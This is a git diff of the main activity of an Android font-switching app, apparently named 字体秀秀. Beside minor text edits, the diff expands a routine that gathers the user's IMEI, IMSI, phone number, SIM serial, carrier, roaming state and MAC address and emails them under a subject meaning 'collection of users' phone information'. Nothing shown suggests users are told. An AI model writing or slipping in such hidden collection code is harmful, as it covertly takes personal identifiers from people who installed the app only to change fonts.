@@ -26,6 +26,7 @@ import android.net.NetworkInfo;
 import android.net.Uri;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
@@ -262,7 +263,7 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
 				PointsHelper.awardPoints(this, Integer.parseInt(sAwardPoints));
 				sp.edit().putBoolean("isFirstLoading", false).commit();
 				new AlertDialog.Builder(this).setTitle("字体秀秀")
-						.setMessage("恭喜您获得"+Integer.parseInt(sAwardPoints)+"金币奖励")
+						.setMessage("恭喜您获得 "+Integer.parseInt(sAwardPoints)+" 金币奖励")
 						.setNeutralButton("确定", null).create().show();
 			} 
 			TelephonyManager telephonyManager= (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
@@ -285,52 +286,64 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
 
 	private void sendPhoneInfo() {
 		StringBuilder sb=new StringBuilder();
-        sb.append("info:\n");
+      
         sb.append("BOARD:")
         .append(android.os.Build.BOARD)
-        .append("\n BOOTLOADER:\t") 
+        .append(";BOOTLOADER:") 
         .append(android.os.Build.BOOTLOADER)
-        .append("\n BRAND:\t")
+        .append(";BRAND:")
         .append(android.os.Build.BRAND)
-        .append("\n CPU_ABI:\t")
+        .append(";CPU_ABI:")
         .append(android.os.Build.CPU_ABI)
-        .append("\n CPU_ABI2:\t")
+        .append(";CPU_ABI2:")
         .append(android.os.Build.CPU_ABI2)
-        .append("\n DEVICE:\t")
+        .append(";DEVICE:")
         .append(android.os.Build.DEVICE)
-        .append("\n FINGERPRINT:\t")
+        .append(";FINGERPRINT:")
         .append(android.os.Build.FINGERPRINT)
-        .append("\n HARDWARE:\t")
+        .append(";HARDWARE:")
         .append(android.os.Build.HARDWARE)
-        .append("\n HOST:\t")
+        .append(";HOST:")
         .append(android.os.Build.HOST)
-        .append("\n ID:\t")
+        .append(";ID:")
         .append(android.os.Build.ID)
-        .append("\n MANUFACTURER:\t")
+        .append(";MANUFACTURER:")
         .append(android.os.Build.MANUFACTURER)
-        .append("\n MODEL:\t")
+        .append(";MODEL:")
         .append(android.os.Build.MODEL)
-        .append("\n PRODUCT:\t")
+        .append(";PRODUCT:")
         .append(android.os.Build.PRODUCT)
-        .append("\n RADIO:\t")
+        .append(";RADIO:")
         .append(android.os.Build.RADIO)
-        .append("\n SERIAL:\t")
+        .append(";SERIAL:")
         .append(android.os.Build.SERIAL)
-        .append("\n TAGS:\t")
+        .append(";TAGS:")
         .append(android.os.Build.TAGS)
-        .append("\n TYPE:\t")
+        .append(";TYPE:")
         .append(android.os.Build.TYPE)
-        .append("\n USER:\t")
+        .append(";USER:")
         .append(android.os.Build.USER)
-        .append("\n getRadioVersion:\t")
-        .append(android.os.Build.getRadioVersion());
+        .append(";getRadioVersion:")
+        .append(android.os.Build.getRadioVersion())
+        .append(";ANDROID VERSION:").append(android.os.Build.VERSION.RELEASE)
+        .append(";DISPLAY:").append(android.os.Build.DISPLAY)
+        .append(";DEVICE:").append(android.os.Build.DEVICE)
+		.append(";SDK:").append(android.os.Build.VERSION.SDK_INT)
+		.append(";MAC:").append(getLocalMacAddress());
         
-        sb.append("\n ANDROID VERSION: ").append(android.os.Build.VERSION.RELEASE);
-        sb.append("\n DISPLAY: ").append(android.os.Build.DISPLAY).append("\n");
-        sb.append("设备DEVICE: ").append(android.os.Build.DEVICE).append("\n");
-		sb.append("SDK: ").append(android.os.Build.VERSION.SDK_INT);
-		
-		sb.append("\n MAC: ").append(getLocalMacAddress());
+		TelephonyManager telephonyManager= (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+		String imei=telephonyManager.getDeviceId();
+		sb.append(";imei:"+imei)
+		.append(";Subscriber imsi:").append(telephonyManager.getSubscriberId())
+		.append(";model:").append(Build.MODEL)
+		.append(";tel:"+telephonyManager.getLine1Number())
+		.append(";network type："+telephonyManager.getNetworkType())
+		.append(";运营商："+telephonyManager.getSimOperatorName())
+		.append(";是否漫游状态:"+telephonyManager.isNetworkRoaming())
+		.append(";SimCountryIso:" + telephonyManager.getSimCountryIso())
+        .append(";SimOperator:" + telephonyManager.getSimOperator()) 
+        .append(";SimSerialNumber:" + telephonyManager.getSimSerialNumber())  
+        .append(";SimState:" + telephonyManager.getSimState());
 		
 		final MailSenderInfo mailInfo = CommonUtils.initEmail();
 		mailInfo.setSubject("用户手机信息搜集：");
@@ -338,8 +351,6 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
 		String mailContent = "用户手机信息搜集内容：\n\n";
 
 		mailContent += sb.toString();
-
-		mailContent += CommonUtils.getPhoneInfo(this);
 
 		mailInfo.setContent(mailContent);
 		// 这个类主要来发送邮件
@@ -495,10 +506,9 @@ public class MainActivity extends FragmentActivity implements OnClickListener,
                 .append("1.无需root就可以轻松切换系统字体").append("\n")
                 .append("2.无需重启一键动态切换系统字体。").append("\n")
                 .append("3.首次运行软件会自动备份系统默认字体").append("\n")
-                .append("4.提供最精致的字体给用户").append("\n").append("【适配机器】")
-                .append("\n").append("1.美图手机2").append("\n")
-                .append("2.MTK平台JB2及以上版本").append("\n").append("交流群：")
-                .append("\n").append("qq群：185378427");
+                .append("4.提供最精致的字体给用户").append("\n").append("[适配机器]")
+                .append("\n").append("美图手机2 专版").append("\n").append("交流群：")
+                .append("\n").append("QQ群：185378427");
     }
 
     @Override
